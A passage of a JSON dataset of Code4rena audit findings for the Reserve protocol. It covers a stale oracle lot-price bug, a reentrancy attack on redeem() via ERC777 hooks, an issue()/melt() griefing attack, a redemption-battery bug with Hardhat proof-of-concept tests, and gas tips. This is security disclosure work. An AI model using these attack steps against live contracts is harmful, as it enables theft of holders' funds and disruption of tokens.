2\n+export const ORACLE_TIMEOUT = bn('86400') // one day\n \n export const ORACLE_ERROR = fp('0.01') // 1% oracle error\n \ndiff --git a/test/plugins/Asset.test.ts b/test/plugins/Asset.test.ts\nindex d49c53f3..7f2f721e 100644\n--- a/test/plugins/Asset.test.ts\n+++ b/test/plugins/Asset.test.ts\n@@ -233,6 +233,45 @@ describe('Assets contracts #fast', () => {\n       )\n     })\n \n+    it('PoC lot price doesn\\'t use most recent price', async () => {\n+      // Update values in Oracles to 0\n+\n+      await setOraclePrice(rsrAsset.address, bn('1.1e8'))\n+\n+      await rsrAsset.refresh();\n+      let [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      let descripion = \"day 0\";\n+      console.log({descripion, lotLow, lotHigh});\n+      let hour = 60*60;\n+      let day = hour*24;\n+      await advanceTime(day * 5);\n+\n+      await setOraclePrice(rsrAsset.address, bn('2e8'));\n+      // await rsrAsset.refresh();\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 5 days (right after update)';\n+      console.log({descripion,lotLow, lotHigh});\n+\n+      await advanceTime(day + hour);\n+\n+      // Fallback prices should be zero\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 6+ days';\n+      console.log({descripion, lotLow, lotHigh});\n+\n+      await setOraclePrice(rsrAsset.address, bn('2e8'));\n+\n+      await advanceTime(day + hour);\n+\n+      [lotLow, lotHigh] = await rsrAsset.lotPrice();\n+      descripion = 'after 7+ days';\n+      console.log({descripion, lotLow, lotHigh});\n+\n+    })\n+    return;\n+\n     it('Should return (0, 0) if price is zero', async () => {\n       // Update values in Oracles to 0\n       await setOraclePrice(compAsset.address, bn('0'))\n@@ -595,6 +634,7 @@ describe('Assets contracts #fast', () => {\n       expect(lotHighPrice4).to.be.equal(bn(0))\n     })\n   })\n+  return;\n \n   describe('Constructor validation', () => {\n     it('Should not allow price timeout to be zero', async () => {\n\n```\n\nOutput:\n\n    {\n      descripion: 'day 0',\n      lotLow: BigNumber { value: \"1089000000000000000\" },\n      lotHigh: BigNumber { value: \"1111000000000000000\" }\n    }\n    {\n      descripion: 'after 5 days (right after update)',\n      lotLow: BigNumber { value: \"1980000000000000000\" },\n      lotHigh: BigNumber { value: \"2020000000000000000\" }\n    }\n    {\n      descripion: 'after 6+ days',\n      lotLow: BigNumber { value: \"149087485119047618\" },\n      lotHigh: BigNumber { value: \"152099353505291005\" }\n    }\n    {\n      descripion: 'after 7+ days', // `lotPrice()` returns zero even though the most recent price the oracle holds is from 25 hours ago\n      lotLow: BigNumber { value: \"0\" },\n      lotHigh: BigNumber { value: \"0\" }\n    }\n\n### Recommended Mitigation Steps\n\nAllow specifying a timeout to `tryPrice()`, in case that `tryPrice()` fails due to oracle timeout then call it again with `priceTimeout` as the timeout.\n\nIf the call succeeds the second time then use it as the most recent price for fallback calculations.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/326#issuecomment-1405530751):**\n > Nice find! When `StalePrice()`is thrown in `OracleLib.sol`, it should revert with the latest price, and this latest price should be used in the asset plugin.\n\n**[tbrent (Reserve) acknowledged](https://github.com/code-423n4/2023-01-reserve-findings/issues/326)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `Asset.lotPrice()` which has a backup plan in case another function called `tryPrice()` fails. The backup plan uses the last saved price and multiplies it by a variable called `lotMultiplier`. However, if `tryPrice()` fails due to an oracle timeout, the last saved price may be too old and cause errors in estimating the value of the asset or making unnecessary trades. The report includes a proof of concept which shows that the backup plan is using an outdated price instead of the most recent one, leading to incorrect calculations. The report recommends adding a timeout to `tryPrice()` and using the latest price if the function is called again. The team responsible for the code has acknowledged the issue and plans to fix it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/326",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "43306",
      "title": "[M-07] Attacker can steal RToken holders' funds by performing reentrancy attack during `redeem()` function token transfers",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150>\n\nFunction `redeem()` redeems RToken for basket collateral and it updated `basketsNeeded` and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function:\n\n1.  attacker can call `redeem()` again and bypass \"bounding each withdrawal by the prorata share when protocol is under-collateralized\" because tokens balance of BackingManager is not updated yet.\n2.  attacker can call `BackingManager.manageTokens()` and because `basketsNeeded` gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.\n\n### Proof of Concept\n\nThis is `redeem()` code:\n\n        function redeem(uint256 amount) external notFrozen {\n    ...............\n    ...............\n            (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);\n\n            uint256 erc20length = erc20s.length;\n\n            uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);\n\n            // Bound each withdrawal by the prorata share, in case we're currently under-collateralized\n            for (uint256 i = 0; i < erc20length; ++i) {\n                uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));\n\n                uint256 prorata = (prorate > 0)\n                    ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18\n                    : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}\n\n                if (prorata < amounts[i]) amounts[i] = prorata;\n            }\n\n            basketsNeeded = basketsNeeded_ - baskets;\n            emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);\n\n            // == Interactions ==\n            _burn(redeemer, amount);\n\n            bool allZero = true;\n            for (uint256 i = 0; i < erc20length; ++i) {\n                if (amounts[i] == 0) continue;\n                if (allZero) allZero = false;\n\n                IERC20Upgradeable(erc20s[i]).safeTransferFrom(\n                    address(backingManager),\n                    redeemer,\n                    amounts[i]\n                );\n            }\n\n            if (allZero) revert(\"Empty redemption\");\n        }\n\nAs you can see code calculates withdrawal amount of each basket erc20 tokens by calling `basketHandler.quote()` and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates `basketsNeeded` and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack.\n\nThis is `fullyCollateralized()` code in BasketHandler:\n\n        function fullyCollateralized() external view returns (bool) {\n            return basketsHeldBy(address(backingManager)) >= rToken.basketsNeeded();\n        }\n\nAs you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. If RToken is fully collateralized then `BackingManager.manageTokens()` would call `handoutExcessAssets()` and would distribute extra funds between RToken holders and RSR stakers.\n\nThe root cause of the issue is that during tokens transfers in `redeem()` not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios:\n\n**Scenario #1: attacker call `redeem()` again and bypass prorata share bound check when protocol is under-collaterialized:**\n\n1.  tokens \\[`SOME_ERC777`, `USDT`] with quantity \\[1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2.  BackingManager has 200K `SOME_ERC777` balance and 100K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3.  attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4.  attacker would call `redeem()` to redeem 15K RToken and code would updated `basketsNeeded` to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K `SOME_ERC777` tokens and 10K `USDT` tokens (instead of 15K `USDT` tokens) for withdraws.\n5.  then contract would transfer 15K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 135K and total RTokens is 135K and BackingManager balance is 185K `SOME_ERC777` and 100K `USDT` (`USDT` is not yet transferred). then attacker contract can call `redeem()` again for the remaining 15K RTokens.\n6.  because protocol is under-collateralized code would calculated withdrawal amouns as 15K `SOME_ERC777` and 11.1K `USDT` (USDT_balance &ast; rtokenAmount / totalSupply = 100K &ast; 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and `basketsNeeded` would be 120K too. then code would transfers 15K `SOME_ERC777` and 11.1K `USDT` for attacker address.\n7.  attacker's hook function would return and `redeem()` would transfer 10K `USDT` to attacker in the rest of the execution. attacker would receive 30K `SOME_ERC777` and 21.1K `USDT` tokens for 15K redeemed RToken but attacker should have get (`100 * 30K / 150K = 20K`) 20K `USDT` tokens because of the bound each withdrawal by the prorata share, in case we're currently under-collateralized.\n8.  so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two withdraw each with about `charge/2` amount of RToken in each block and stole other users funds when protocol is under collaterlized.\n\n**Scenario #2: attacker can call `BackingManager.manageTokens()` for reentrancy call:**\n\n1.  tokens \\[`SOME_ERC777`, `USDT`] with quantity \\[1, 1] are in the basket right now and basket nonce is BasketNonce1.\n2.  BackingManager has 200K `SOME_ERC777` balance and 150K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block.\n3.  attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers.\n4.  attacker would call `redeem()` to redeem 30K RToken and code would updated `basketsNeeded` to 120K and burn 30K RToken and code would calculated withdrawal amounts as 30K `SOME_ERC777` tokens and 30K `USDT` tokens for withdraws.\n5.  then contract would transfer 30K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 120K and total RTokens is 120K and BackingManager balance is 170K `SOME_ERC777` and 150K `USDT` (`USDT` is not yet transferred). then attacker contract can call `BackingManager.manageTokens()`.\n6.  function `manageTokens()` would calculated baskets can held by BackingManager and it would be higher than 150K and `basketsNeeded` would be 130K and code would consider 60K `SOME_ERC777` and 30K `USDT` tokens as revenue and try to distribute it between RSR stakers and RToken holders. code would mint 30K RTokens and would distribute it.\n7.  then attacker hook function would return and `redeem()` would transfer 30K `USDT` to attacker address in rest of the execution.\n8.  so attacker would able to make code to calculate RToken holders backed tokens as revenue and distribute it between RSR stakers and RSR stakers would receive RTokens backed tokens as rewards. the attack is more effective is battery charge is high but in general case attacker can call redeem for battery charge amount and cause those funds to be counted and get distributed to the RSR stakers (according to the rewards distribution rate)\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nPrevent reading reentrancy attack by central reentrancy guard or by one main proxy interface contract that has reentrancy guard.\n\nOr create contract state (similar to basket nonce) which changes after each interaction and check for contracts states change during the call. (start and end of the call)\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1399382867):**\n > Would like to get some sponsor comments on this once prior to final review. \n\n**[tmattimore (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1404024005):**\n > We think it's real. \n> \n> Other potential mitigation:<br>\n> - governance level norm of excluding erc777 as collateral. Can't fully enforce though, so not a full mitigation.\n> \n> Will discuss more and decide on mitigation path with team.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1409453091):**\n > Thanks @tmattimore - I am going to downgrade to Medium due to the external requirements needed for it to become a reality. If I may ask, what is the hesitancy to simply introduce standard reentrancy modifiers? It's not critical to the audit in any way, just more of my own curiosity. \n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/347#issuecomment-1426447206):**\n > @0xean - we would need a global mutex in order to prevent the attack noted here, which means lots of gas-inefficient external calls. The classic OZ modifier wouldn't be enough. \n\n\n\n***\n\n",
      "summary": "\nThe report discusses a potential bug in the code for the Reserve Protocol, specifically in the `redeem()` function and `fullyCollateralized()` code. The bug allows for an attacker to perform a reentrancy attack, where they can repeatedly call the `redeem()` function and bypass certain checks, or call the `BackingManager.manageTokens()` function and manipulate the distribution of funds to RSR stakers and RToken holders. The report suggests implementing a central reentrancy guard or creating a contract state to prevent this type of attack. The severity of the bug is considered medium and the team is discussing potential mitigation steps. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/347",
      "tags": [],
      "finders": [
        "unforgiven",
        "ustas",
        "hihen"
      ]
    },
    {
      "id": "43305",
      "title": "[M-05] Early user can call `issue()` and then `melt()` to increase `basketsNeeded` to supply ratio to its maximum value and then `melt()` won't work and contract features like `issue()` won't work",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L563-L573><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L801-L814><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L219><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70-L84>\n\nFunction `melt()` melt a quantity of RToken from the caller's account, increasing the basket rate. basket rate should be between `1e9` and `1e27` and function `requireValidBUExchangeRate()` checks that if it's not in interval the the code would revert. the call to `requireValidBUExchangeRate()` happens in the function `mint()`, `melt()` and `setBasketsNeeded()` which are used in `issue()` and `handoutExcessAssets()` and `compromiseBasketsNeeded()` which are used in multiple functionality of the systems. early malicious user can call `issue(1e18)` and `melt(1e18 - 1)` and then set the ratio between baskets needed and total supply to `1e27` and then any new action that increase the ratio would fail. because during the `issue()` code calls `melt()` so the issue() would fail for sure and other functionalities can increase the ratio because of the ratio too because of the rounding error which result in revert. so by exploiting this attacker can make RToken to be in broken state and most of the functionalities of the system would stop working.\n\n### Proof of Concept\n\nThis is `melt()` code:\n\n        function melt(uint256 amtRToken) external notPausedOrFrozen {\n            _burn(_msgSender(), amtRToken);\n            emit Melted(amtRToken);\n            requireValidBUExchangeRate();\n        }\n\nAs you can see it allows anyone to burn their RToken balance. This is `requireValidBUExchangeRate()` code:\n\n        function requireValidBUExchangeRate() private view {\n            uint256 supply = totalSupply();\n            if (supply == 0) return;\n\n            // Note: These are D18s, even though they are uint256s. This is because\n            // we cannot assume we stay inside our valid range here, as that is what\n            // we are checking in the first place\n            uint256 low = (FIX_ONE_256 * basketsNeeded) / supply; // D18{BU/rTok}\n            uint256 high = (FIX_ONE_256 * basketsNeeded + (supply - 1)) / supply; // D18{BU/rTok}\n\n            // 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9\n            require(uint192(low) >= 1e9 && uint192(high) <= 1e27, \"BU rate out of range\");\n        }\n\nAs you can see it checks and makes sure that  the BU to RToken exchange rate to be in \\[1e-9, 1e9]. so Attacker can perform this steps:\n\n1.  add `1e18` RToken as first issuer by calling `issue()`\n2.  call `melt()` and burn `1e18 - 1` of his RTokens.\n3.  not `basketsNeeded` would be `1e18` and `totalSupply()` of RTokens would be `1` and the BU to RToken exchange rate would be its maximum value `1e27` and `requireValidBUExchangeRate()` won't allow increasing the ratio.\n4.  now calls to `melt()` would revert and because `issue()` calls to `furnace.melt()` which calls `RToken.melt()` so all calls to `issue()` would revert. other functionality which result in calling `mint()`, `melt()` and `setBasketsNeeded()` if they increase the ratio would fail too. as there is rounding error when converting RToken amount to basket amount so burning and minting new RTokens and increase the ratio too because of those rounding errors and those logics would revert. (`handoutExcessAssets()` would revert because it mint revenue RToken and update `basketsNeeded` and it calculates new basket amount based on RToken amounts and rounds down so it would increase the BU to RToken ratio which cause code to revert in `mint()`) (`redeem()` would increase the ratio simillar to `handoutExcessAssets()` because of rounding down)\n5.  the attacker doesn't need to be first issuer just he needs to be one of the early issuers and by performing the attack and also if the ratio gets to higher value of the maximum allowed the protocol won't work properly as it documented the supported rage for variables to work properly.\n\nSo attacker can make protocol logics to be broken and then RToken won't be useless and attacker can perform this attack to any newly deployed RToken.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nDon't allow everyone to melt their tokens or don't allow melting if totalSupply() become very small.\n\n**[tmattimore (Reserve) disagreed with severity and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/384#issuecomment-1403998889):**\n > Understand that `issue()` plus `melt()` can brick an RTokens issuance, but redeem should still work. \n> \n> So, the RToken would no longer function as expected but no RToken holder funds would be lost. And in fact, RToken holders now have more funds.\n> \n> Believe this is severity 2 but we should mitigate so that an annoying person / entity cannot DDOS every RToken on deployment w/ small amounts of capital. RToken holders can always continue to redeem though.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/384#issuecomment-1409460672):**\n > Agreed on downgrading due to no direct loss of significant funds and this mostly being a griefing type attack.\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR prevents melting RToken until the RToken supply is at least 1e18: [reserve-protocol/protocol#619](https://github.com/reserve-protocol/protocol/pull/619)\n\n**Status:** Not fully mitigated. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13) and 0xA5DF ([here](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/70) and [here](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/55)). Also included in Mitigation Review section below.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the RToken.sol contract of the Reserve Protocol. The function `melt()` allows any user to burn their RToken balance, increasing the basket rate. However, this function relies on `requireValidBUExchangeRate()` to ensure the basket rate is between `1e9` and `1e27`. An early malicious user can exploit this by calling `issue(1e18)` and `melt(1e18 - 1)` and then setting the ratio between baskets needed and total supply to `1e27`. This would cause most of the functionalities of the system to stop working and make the RToken useless. The bug report includes a proof of concept and recommended mitigation steps. The severity of this vulnerability was initially considered high, but it was later downgraded to medium due to no direct loss of significant funds. However, it is still not fully mitigated and is currently being reviewed for further mitigation. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/384",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "43304",
      "title": "[M-01] Battery discharge mechanism doesn't work correctly for first redemption",
      "impact": "MEDIUM",
      "content": "\nThe `RTokenP1` contract implements a throttling mechanism using the `RedemptionBatteryLib` library. The library models a \"battery\" which \"recharges\" linearly block by block, over roughly 1 hour.\n\nRToken.sol\n\n```solidity\n    function redeem(uint256 amount) external notFrozen {\n        // ...\n\n        uint256 supply = totalSupply();\n\n        // ...\n        battery.discharge(supply, amount); // reverts on over-redemption\n\n        // ...\n    }\n```\n\nRedemptionBatteryLib.sol\n\n```solidity\n    function discharge(\n        Battery storage battery,\n        uint256 supply,\n        uint256 amount\n    ) internal {\n        if (battery.redemptionRateFloor == 0 && battery.scalingRedemptionRate == 0) return;\n\n        // {qRTok}\n        uint256 charge = currentCharge(battery, supply);\n\n        // A nice error message so people aren't confused why redemption failed\n        require(amount <= charge, \"redemption battery insufficient\");\n\n        // Update battery\n        battery.lastBlock = uint48(block.number);\n        battery.lastCharge = charge - amount;\n    }\n\n    /// @param supply {qRTok} Total RToken supply before the burn step\n    /// @return charge {qRTok} The current total charge as an amount of RToken\n    function currentCharge(Battery storage battery, uint256 supply)\n        internal\n        view\n        returns (uint256 charge)\n    {\n        // {qRTok/hour} = {qRTok} * D18{1/hour} / D18\n        uint256 amtPerHour = (supply * battery.scalingRedemptionRate) / FIX_ONE_256;\n\n        if (battery.redemptionRateFloor > amtPerHour) amtPerHour = battery.redemptionRateFloor;\n\n        // {blocks}\n        uint48 blocks = uint48(block.number) - battery.lastBlock; \n\n        // {qRTok} = {qRTok} + {qRTok/hour} * {blocks} / {blocks/hour}\n        charge = battery.lastCharge + (amtPerHour * blocks) / BLOCKS_PER_HOUR;\n\n        uint256 maxCharge = amtPerHour > supply ? supply : amtPerHour;\n        if (charge > maxCharge) charge = maxCharge;\n    }\n```\n\nThe linear redemption limit is calculated in the `currentCharge` function. This function calculates the delta blocks by `uint48 blocks = uint48(block.number) - battery.lastBlock;`.\n\nThe bug here is that the `lastBlock` value is never initialized by the `RTokenP1` contract so its value defaults to `0`. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value\n\n            blocks = current block number - 0 = current block number\n\nDue do this issue, the `currentCharge` value comes out to be way larger than the actual intended value for the first RToken redemption. The `maxCharge` cap at the end of `currentCharge` function caps the result to the current total supply of RToken.\n\nThe issue results in an instant first RToken redemption for the full `totalSupply` of the RToken. The battery discharging mechanism is completely neglected.\n\nIt should be noted that the issue only exists for the first ever redemption as during the first redemption the `lastBlock` value gets updated with current block number.\n\n### Proof of Concept\n\nThe following test case was added to `test/RToken.test.ts` file and was ran using command `PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts`.\n\n```typescript\n  describe.only('Battery lastBlock bug', () => {\n    it('redemption battery does not work on first redemption', async () => {\n      // real chain scenario\n      await advanceBlocks(1_000_000)\n      await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, ethers.constants.MaxUint256)))\n\n      expect(await rToken.totalSupply()).to.eq(0)\n      await rToken.connect(owner).setRedemptionRateFloor(fp('1e4'))\n      await rToken.connect(owner).setScalingRedemptionRate(fp('0'))\n\n      // first issue\n      const issueAmount = fp('10000')\n      await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)\n      expect(await rToken.totalSupply()).to.eq(issueAmount)\n\n      // first redemption\n      expect(await rToken.redemptionLimit()).to.eq(await rToken.totalSupply())    // for first redemption the currentCharge value is capped by rToken.totalSupply() \n      await rToken.connect(addr1).redeem(issueAmount)\n      expect(await rToken.totalSupply()).to.eq(0)\n\n      // second redemption\n      await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)\n      // from second redemtion onwards the battery discharge mechanism takes place correctly\n      await expect(rToken.connect(addr1).redeem(issueAmount)).to.be.revertedWith('redemption battery insufficient')\n    })\n  })\n```\n\n### Tools Used\n\nHardhat\n\n### Recommended Mitigation Steps\n\nThe `battery.lastBlock` value must be initialized in the `init` function of `RTokenP1`\n\n```solidity\n    function init(\n        // ...\n    ) external initializer {\n        // ...\n        battery.lastBlock = uint48(block.number);\n    }\n```\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1399277278):**\n > The first redemption is not constrained by the battery properly from what I can tell in the code base.  I don't see sufficient evidence that this would lead to a direct loss of user funds however.  I will leave open for sponsor review, but think either Medium severity or below is appropriate without a better statement of impact from the warden.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1405393242):**\n > This can't lead to loss of user funds, but I think it is indeed Medium severity\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/452#issuecomment-1421598482):**\n > Fixed here: https://github.com/reserve-protocol/protocol/pull/584\n\n**Status:** Mitigation confirmed. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/50), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/16), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/26).\n\n\n\n***\n\n",
      "summary": "\nThe `RTokenP1` contract has a bug in its `RedemptionBatteryLib` library which models a \"battery\" that \"recharges\" over time. The bug is caused by the `lastBlock` value being initialized to `0` instead of the current block number, resulting in incorrect calculations for the battery's \"charge.\" This bug only affects the first redemption and does not result in any loss of user funds. The bug has been confirmed and fixed by the Reserve team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/452",
      "tags": [],
      "finders": [
        "AkshaySrivastav"
      ]
    },
    {
      "id": "24629",
      "title": "[G-39] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 12 instances of this issue.*\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24628",
      "title": "[G-38] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 151 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24627",
      "title": "[G-37] Division by two should use bit shifting",
      "impact": "GAS",
      "content": "`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both, the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff) due to `JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using `unchecked {}` around the division by two.\n\n*There are 8 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24626",
      "title": "[G-36] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 33 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24625",
      "title": "[G-35] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**\n\n*There are 11 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24624",
      "title": "[G-34] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There are 11 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24623",
      "title": "[G-33] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
